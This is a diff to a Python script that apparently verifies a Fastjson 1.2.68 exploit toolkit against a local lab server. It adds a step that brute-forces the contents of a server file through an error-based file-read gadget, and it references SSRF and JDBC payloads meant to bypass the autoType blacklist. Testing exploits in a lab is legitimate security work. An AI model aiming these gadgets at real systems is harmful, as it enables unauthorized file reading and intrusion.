@@ -25,7 +25,7 @@ from fastjson_toolkit.poc.v1_2_68.payloads import (
     build_postgresql_ssrf,
 )
 
-ROOT = Path(__file__).resolve().parents[1]
+ROOT = Path(__file__).resolve().parents[2]
 LAB = ROOT / "lab" / "fastjson-1268-lab"
 PROOF = ROOT / "tmp_lab" / "1268_proof"
 BASE = "http://127.0.0.1:18268"
@@ -235,6 +235,29 @@ def main() -> int:
         build_io_read_error("file:///tmp/fj1268_copy_src", guess_byte=70),  # 'F'
         check_read_error,
     )
+
+    # --- 报错读全文：爆破读 /tmp/fj1268_copy_src → FJ1268_COPY_SRC\n ---
+    from fastjson_toolkit.poc import Poc1268SendOptions, run_poc_1268
+
+    print("[*] io_read_error brute full file")
+    brute = run_poc_1268(
+        Poc1268SendOptions(
+            gadget="io_read_error",
+            url="file:///tmp/fj1268_copy_src",
+            read_length=32,
+            read_charset="mixed",
+            target=f"{BASE}/api/fastjson",
+            send=True,
+            timeout=10.0,
+        )
+    )
+    expected = "FJ1268_COPY_SRC"
+    got = brute.read_content or ""
+    ok_brute = brute.ok and got.startswith(expected)
+    print(f"    summary={brute.summary}")
+    print(f"    content={got!r}")
+    results["io_read_error_brute"] = "PASS" if ok_brute else "FAIL"
+    print("    PASS" if ok_brute else "    FAIL")
 
     # --- JDBC：证明绕过黑名单并尝试连接（期望连接失败类错误，而非 autoType not support）---
     def check_jdbc(code: int, text: str) -> bool:
